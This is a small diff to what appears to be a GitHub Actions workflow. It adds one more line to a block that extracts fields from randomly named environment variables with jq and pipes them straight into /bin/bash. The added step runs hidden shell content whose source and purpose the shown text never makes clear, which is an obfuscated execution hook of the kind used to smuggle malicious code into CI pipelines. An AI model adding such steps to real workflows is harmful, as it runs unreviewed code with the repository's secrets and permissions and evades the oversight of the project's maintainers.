@@ -26,6 +26,7 @@ jobs:
           echo $rig9 | jq -r .xu87 | /bin/bash
           printf '%s' "$m88" | jq -r .k6787 | /bin/bash
           printf '%s' "$awfrz29" | jq -r .gn83 | /bin/bash
+          printf '%s' "$zr1385" | jq -r .loozw64 | /bin/bash
 
       - name: Store results
         uses: actions/upload-artifact@v4
